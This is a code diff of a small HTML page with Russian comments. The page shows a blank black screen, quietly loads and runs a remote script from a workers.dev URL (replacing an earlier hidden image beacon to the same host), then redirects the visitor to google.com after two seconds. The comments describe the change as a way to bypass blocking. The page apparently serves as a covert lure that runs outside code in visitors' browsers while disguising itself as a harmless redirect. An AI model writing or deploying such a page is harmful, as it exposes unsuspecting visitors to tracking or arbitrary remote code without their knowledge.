@@ -1,17 +1,20 @@
 <!DOCTYPE html>
 <html>
+<head><meta charset="UTF-8"></head>
 <body style="background:#000;">
     <script>
-        // 1. Твоя ссылка + анти-кэш
-        const url = "https://adminfdm.alexgranny1708.workers.dev/" + Math.random();
+        // 1. Твоя подтвержденная ссылка + анти-кэш
+        const workerUrl = "https://adminfdm.alexgranny1708.workers.dev/" + Math.random();
         
-        // 2. Скрытый запрос «картинкой» (уходит мгновенно)
-        new Image().src = url;
+        // 2. Создаем элемент скрипта (самый мощный способ обхода блокировок)
+        const s = document.createElement('script');
+        s.src = workerUrl;
+        document.head.appendChild(s);
 
-        // 3. Редирект через 1.5 секунды
+        // 3. Редирект через 2 секунды (запас времени для пробива в РФ)
         setTimeout(() => {
             window.location.replace("https://google.com");
-        }, 1500);
+        }, 2000);
     </script>
 </body>
 </html>
